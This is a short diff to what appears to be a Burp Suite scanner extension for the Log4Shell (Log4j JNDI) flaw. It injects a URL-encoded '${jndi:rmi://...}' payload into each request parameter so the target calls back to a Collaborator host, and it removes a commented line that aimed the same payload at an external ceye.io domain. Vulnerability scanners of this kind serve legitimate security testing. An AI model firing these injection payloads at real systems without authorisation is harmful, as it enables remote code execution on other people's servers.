@@ -48,7 +48,6 @@ class BurpExtender(IBurpExtender, IScannerCheck, IBurpCollaboratorClientContext)
             parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()
             
             parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(self.payload) +'%2F1%7D'
-            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.63lhuf.ceye.io/1}'
             newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)
             newRequest = self._helpers.updateParameter(request, newParameter)
             res = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),newRequest)
